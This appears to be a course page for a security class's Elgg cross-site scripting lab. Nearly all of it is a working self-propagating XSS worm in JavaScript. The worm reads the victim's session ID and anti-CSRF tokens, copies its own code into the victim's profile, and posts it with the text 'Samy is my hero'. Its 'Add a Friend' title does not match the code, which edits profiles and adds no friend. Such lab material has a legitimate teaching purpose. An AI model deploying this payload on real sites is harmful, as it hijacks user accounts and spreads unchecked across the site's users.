---
layout: default
course_number: CS335
title: Code - Add a Friend
---

Example of add a friend script (self propagating)

```javascript
<script type="text/javascript" id="worm">
  window.onload = function(){
    var user_guid  = "&guid=" + elgg.session.user.guid;
    var elgg_ts    = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var elgg_token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    var name  = "&name=" + elgg.session.user.name;

    var headerTag = "<script type='text/javascript' id='worm'>";
    var js = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>";

    var wormCode = encodeURIComponent(headerTag + js + tailTag);

    var form  = "&description=";
    form += wormCode;
    form += "&accesslevel%5Bdescription%5D=2";

    form += "&briefdescription=Samy is my hero";
    form += "&accesslevel%5Bbriefdescription%5D=2";

    var url = "http://www.xsslabelgg.com/action/profile/edit";
    var content = elgg_token + elgg_ts + name + form + user_guid;

    if (elgg.session.user.guid != 47){                  
      var request = new XMLHttpRequest();
      request.open("POST", url, true);
      request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      request.send(content);
    }
  }
</script>
```
